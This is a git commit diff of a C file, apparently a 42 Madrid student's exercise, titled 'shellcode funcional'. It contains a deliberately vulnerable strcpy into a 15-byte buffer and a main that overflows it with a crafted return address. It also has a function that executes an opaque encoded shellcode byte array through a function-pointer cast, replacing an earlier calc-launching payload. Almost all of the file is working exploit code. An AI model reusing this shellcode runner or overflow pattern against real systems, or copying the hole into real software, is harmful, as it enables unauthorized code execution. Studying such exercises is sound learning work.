d886e22edfed10f0801acaf80eddf39dc896abb0
SrTonno <tvillare@student.42madrid.com>
2023-05-17 17:53:55 +0200

    shellcode funcional

--- tsunami.c
+++ tsunami.c
@@ -6,41 +6,43 @@
 /*   By: tvillare <tvillare@student.42madrid.com    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/05/17 14:11:16 by tvillare          #+#    #+#             */
-/*   Updated: 2023/05/17 14:41:43 by tvillare         ###   ########.fr       */
+/*   Updated: 2023/05/17 17:52:02 by tvillare         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include <string.h>
+#include <stdio.h>
 
-int vulnerable_function(char *str)
+void vulnerable_function(char *str)
 {
-	char	buffer[14];
-	char	relleno[14] = "AAAAAAAAAAAAA\0"; //13 A;
-
-	//relleno = "AAAAAAAAAAAAA" //13
-	str = strcat(relleno, str);
+	char	buffer[15];
 	strcpy(buffer, str);
 
-	return (0);
 }
 
-int	shellcode()
+void	shellcode()
 {
-	char shellcode[] =
-		"\x31\xC9"					// xor ecx,ecx
-		"\x51"						// push ecx
-		"\x68\x63\x61\x6C\x63"		// push 0x636c6163
-		"\x54"						// push dword ptr esp
-		"\xB8\xC7\x93\xC2\x77"		// mov eax,0x77c293c7
-		"\xFF\xD0";					// call eax
 
-	((void(*)())shellcode)();
+	unsigned char shellcode[] = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
+								"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
+								"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
+								"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
+								"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
+								"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
+								"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
+								"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
+								"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
+								"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
+								"\x7f\xe8\x7b\xca";
+	((void (*)())shellcode)();
 
-	return (0);
 }
-int main()
+
+int main(int argc, char **argv)
 {
-	// vulnerable_function("\xc0\x10\x40");
-	shellcode()
+	(void) argc;
+	(void) argv;
+	vulnerable_function("09874500064888675436\xc0\x10\x40\x00");
+
 	return (0);
 }
